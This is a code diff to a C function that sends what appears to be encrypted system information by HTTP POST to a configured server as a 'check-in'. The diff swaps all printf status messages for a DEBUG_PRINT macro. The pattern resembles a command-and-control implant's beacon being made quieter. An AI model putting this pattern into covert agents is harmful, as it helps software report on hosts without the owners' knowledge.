@@ -342,28 +342,29 @@ int protocol_checkin(CryptoContext *crypto, SystemInfo *info) {
   // Build request
   char *body = build_request_body(crypto, payload);
   if (!body) {
-    printf("    [!] Failed to build request body\n");
+    DEBUG_PRINT("    [!] Failed to build request body\n");
     return -1;
   }
-  printf("    [*] Request body built (%zu bytes)\n", strlen(body));
+  DEBUG_PRINT("    [*] Request body built (%zu bytes)\n", strlen(body));
 
   // Send request
-  printf("    [*] Sending HTTP POST to %s:%d%s\n", SERVER_HOST, SERVER_PORT,
-         API_CHECKIN);
+  DEBUG_PRINT("    [*] Sending HTTP POST to %s:%d%s\n", SERVER_HOST,
+              SERVER_PORT, API_CHECKIN);
   HttpResponse response;
   int ret = http_post(SERVER_HOST, SERVER_PORT, USE_TLS, API_CHECKIN, body,
                       strlen(body), &response);
   free(body);
 
-  printf("    [*] HTTP result: ret=%d, status=%d\n", ret, response.status_code);
+  DEBUG_PRINT("    [*] HTTP result: ret=%d, status=%d\n", ret,
+              response.status_code);
 
   if (ret != 0 || response.status_code != 200) {
-    printf("    [!] Checkin HTTP failed\n");
+    DEBUG_PRINT("    [!] Checkin HTTP failed\n");
     http_response_free(&response);
     return -1;
   }
 
-  printf("    [+] Checkin HTTP success\n");
+  DEBUG_PRINT("    [+] Checkin HTTP success\n");
   http_response_free(&response);
   return 0;
 }
